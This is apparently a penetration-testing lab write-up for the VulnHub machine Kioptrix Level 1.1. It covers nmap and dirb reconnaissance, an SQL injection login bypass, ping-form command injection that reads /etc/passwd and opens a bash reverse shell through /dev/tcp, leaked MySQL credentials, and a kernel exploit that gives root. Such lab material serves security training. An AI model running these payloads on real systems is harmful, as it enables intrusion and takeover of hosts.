## Machine Info

- **Name**: Kioptrix: Level 1.1 (#2)
- **Date release**: 11 Feb 2011
- **Author**: [Kioptrix](https://www.vulnhub.com/author/kioptrix,8/)
- **Series**: [Kioptrix](https://www.vulnhub.com/series/kioptrix,8/)
- **Web page**: http://www.kioptrix.com/blog/?page_id=135
- **Vulnhub**: [Kioptrix: Level 1.1 (#2) ~ VulnHub](https://www.vulnhub.com/entry/kioptrix-level-11-2,23/)

## PWK

### recon

- nmap

```
$ sudo nmap -sT -sV -sC -O -p22,80,111,443,631,778,3306 $IP -oA nmap/detail
Starting Nmap 7.94 ( https://nmap.org ) at 2023-11-15 04:06 CST
Nmap scan report for 192.168.123.75
Host is up (0.0010s latency).

PORT     STATE SERVICE  VERSION
22/tcp   open  ssh      OpenSSH 3.9p1 (protocol 1.99)
|_sshv1: Server supports SSHv1
| ssh-hostkey:
|   1024 8f:3e:8b:1e:58:63:fe:cf:27:a3:18:09:3b:52:cf:72 (RSA1)
|   1024 34:6b:45:3d:ba:ce:ca:b2:53:55:ef:1e:43:70:38:36 (DSA)
|_  1024 68:4d:8c:bb:b6:5a:bd:79:71:b8:71:47:ea:00:42:61 (RSA)
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
111/tcp  open  rpcbind  2 (RPC #100000)
| rpcinfo:
|   program version    port/proto  service
|   100000  2            111/tcp   rpcbind
|_  100000  2            111/udp   rpcbind
443/tcp  open  ssl/http Apache httpd 2.0.52 ((CentOS))
| sslv2:
|   SSLv2 supported
|   ciphers:
|     SSL2_RC4_64_WITH_MD5
|     SSL2_RC4_128_EXPORT40_WITH_MD5
|     SSL2_DES_192_EDE3_CBC_WITH_MD5
|     SSL2_DES_64_CBC_WITH_MD5
|     SSL2_RC2_128_CBC_EXPORT40_WITH_MD5
|     SSL2_RC2_128_CBC_WITH_MD5
|_    SSL2_RC4_128_WITH_MD5
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.0.52 (CentOS)
| ssl-cert: Subject: commonName=localhost.localdomain/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--
| Not valid before: 2009-10-08T00:10:47
|_Not valid after:  2010-10-08T00:10:47
|_ssl-date: 2023-11-14T17:57:13+00:00; -2h09m39s from scanner time.
631/tcp  open  ipp      CUPS 1.1
|_http-server-header: CUPS/1.1
| http-methods:
|_  Potentially risky methods: PUT
|_http-title: 403 Forbidden
778/tcp  open  status   1 (RPC #100024)
3306/tcp open  mysql    MySQL (unauthorized)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|printer|specialized|remote management|media device|WAP|terminal server
Running (JUST GUESSING): Linux 2.6.X (97%), HP embedded (95%), Riverbed RiOS (94%), Aruba ArubaOS 3.X (93%), Star Track embedded (93%), Aerohive HiveOS 3.X (92%), Source Technologies embedded (92%), Aruba embedded (92%)
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:riverbed:rios cpe:/o:arubanetworks:arubaos:3.3.2 cpe:/o:linux:linux_kernel:2.6.23 cpe:/h:star_track:srt2014hd cpe:/o:aerohive:hiveos:3.4 cpe:/h:sourcetechnologies:st-9650 cpe:/h:arubanetworks:iap-105
Aggressive OS guesses: Linux 2.6.9 - 2.6.30 (97%), Linux 2.6.18 - 2.6.32 (96%), Linux 2.6.9 (95%), HP Designjet T1100ps or Z3100ps printer (95%), Linux 2.6.8 - 2.6.12 (94%), Linux 2.6.9 - 2.6.18 (94%), Riverbed Steelhead Mobile Controller 4.0.3 (94%), Linux 2.6.24 - 2.6.36 (94%), Linux 2.6.9 - 2.6.33 (94%), Linux 2.6.13 - 2.6.32 (94%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
|_clock-skew: -2h09m39s

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.64 seconds
```

### exploit

- 80 - apache - http

```
80/tcp   open  http     Apache httpd 2.0.52 ((CentOS))

http://192.168.123.75/index.php

<!-- Start of HTML when logged in as Administator -->


-> path: nothing

$ dirb http://$IP

-----------------
DIRB v2.22
By The Dark Raver
-----------------

START_TIME: Wed Nov 15 04:22:32 2023
URL_BASE: http://192.168.123.75/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://192.168.123.75/ ----
+ http://192.168.123.75/cgi-bin/ (CODE:403|SIZE:290)
+ http://192.168.123.75/index.php (CODE:200|SIZE:667)
==> DIRECTORY: http://192.168.123.75/manual/
+ http://192.168.123.75/usage (CODE:403|SIZE:287)
```

- crack password [x]
- user : pass -> mysql's users table -> sqli

```
Administator' or 1=1 -- -:1
```

- command injection poc

```
Ping a Machine on the Network: 
google.com

PING google.com (172.217.31.14) 56(84) bytes of data.
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.31 ms
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=4.34 ms
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=6.24 ms

--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2003ms
rtt min/avg/max/mdev = 4.315/4.968/6.249/0.909 ms, pipe 2

-> command injection -> get a shell

google.com; cat /etc/passwd

PING google.com (172.217.31.14) 56(84) bytes of data.
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=0 ttl=58 time=4.66 ms
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=1 ttl=58 time=3.96 ms
64 bytes from del03s01-in-f14.1e100.net (172.217.31.14): icmp_seq=2 ttl=58 time=3.75 ms

--- google.com ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2001ms
rtt min/avg/max/mdev = 3.750/4.127/4.669/0.392 ms, pipe 2
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
news:x:9:13:news:/etc/news:
uucp:x:10:14:uucp:/var/spool/uucp:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
gopher:x:13:30:gopher:/var/gopher:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
vcsa:x:69:69:virtual console memory owner:/dev:/sbin/nologin
rpm:x:37:37::/var/lib/rpm:/sbin/nologin
haldaemon:x:68:68:HAL daemon:/:/sbin/nologin
netdump:x:34:34:Network Crash Dump user:/var/crash:/bin/bash
nscd:x:28:28:NSCD Daemon:/:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
rpc:x:32:32:Portmapper RPC user:/:/sbin/nologin
mailnull:x:47:47::/var/spool/mqueue:/sbin/nologin
smmsp:x:51:51::/var/spool/mqueue:/sbin/nologin
rpcuser:x:29:29:RPC Service User:/var/lib/nfs:/sbin/nologin
nfsnobody:x:65534:65534:Anonymous NFS User:/var/lib/nfs:/sbin/nologin
pcap:x:77:77::/var/arpwatch:/sbin/nologin
apache:x:48:48:Apache:/var/www:/sbin/nologin
squid:x:23:23::/var/spool/squid:/sbin/nologin
webalizer:x:67:67:Webalizer:/var/www/usage:/sbin/nologin
xfs:x:43:43:X Font Server:/etc/X11/fs:/sbin/nologin
ntp:x:38:38::/etc/ntp:/sbin/nologin
pegasus:x:66:65:tog-pegasus OpenPegasus WBEM/CIM services:/var/lib/Pegasus:/sbin/nologin
mysql:x:27:27:MySQL Server:/var/lib/mysql:/bin/bash
john:x:500:500::/home/john:/bin/bash
harold:x:501:501::/home/harold:/bin/bash
```

- command injection exploit

```
google.com; bash -i >& /dev/tcp/192.168.123.99/2233 0>&1
sudo rlwrap nc -lvnp 2233
```

### priv-esc

- enum

```
bash-3.00$ ip a
1: lo: <LOOPBACK,UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0
    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link
       valid_lft forever preferred_lft forever
3: sit0: <NOARP> mtu 1480 qdisc noop
    link/sit 0.0.0.0 brd 0.0.0.0
bash-3.00$ uname -a
Linux kioptrix.level2 2.6.9-55.EL #1 Wed May 2 13:52:16 EDT 2007 i686 i686 i386 GNU/Linux
bash-3.00$ whoami
apache
bash-3.00$ id
uid=48(apache) gid=48(apache) groups=48(apache)
```

- mysql conn [x]

```
bash-3.00$ cat index.php
<?php
        mysql_connect("localhost", "john", "hiroshima") or die(mysql_error());
        //print "Connected to MySQL<br />";
        mysql_select_db("webapp");

        if ($_POST['uname'] != ""){
                $username = $_POST['uname'];
                $password = $_POST['psw'];
                $query = "SELECT * FROM users WHERE username = '$username' AND password='$password'";
                //print $query."<br>";
                $result = mysql_query($query);

                $row = mysql_fetch_array($result);
                //print "ID: ".$row['id']."<br />";
        }

?>

conn mysql [x]
mysql -u john -p hiroshima
```

- linux kernel priv-esc: [Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) - Linux_x86 local Exploit (exploit-db.com)](https://www.exploit-db.com/exploits/9542)

```
$ searchsploit Linux Kernel CentOS 2.6.9
Linux Kernel 2.6 < 2.6.19 (White Box 4 / CentOS 4.4/4.5 / Fedora Core 4/5/6 x86) - 'ip_append_data()' Ring0 Privilege Escalation (1) | linux_x86/local/9542.c

Shellcodes: No Results

bash-3.00$ gcc 9542.c -o 9542
9542.c:109:28: warning: no newline at end of file
bash-3.00$ echo "" >> 9542.c
bash-3.00$ gcc 9542.c -o 9542
sh-3.00# chmod +x 9542
sh-3.00# ./9542
[-] check ur uid
sh-3.00# ip a
1: lo: <LOOPBACK,UP> mtu 16436 qdisc noqueue
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 brd 127.255.255.255 scope host lo
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP> mtu 1500 qdisc pfifo_fast qlen 1000
    link/ether 00:0c:29:fa:ad:8b brd ff:ff:ff:ff:ff:ff
    inet 192.168.123.75/24 brd 192.168.123.255 scope global eth0
    inet6 fe80::20c:29ff:fefa:ad8b/64 scope link
       valid_lft forever preferred_lft forever
3: sit0: <NOARP> mtu 1480 qdisc noop
    link/sit 0.0.0.0 brd 0.0.0.0
sh-3.00# id
uid=0(root) gid=0(root) groups=48(apache)
```

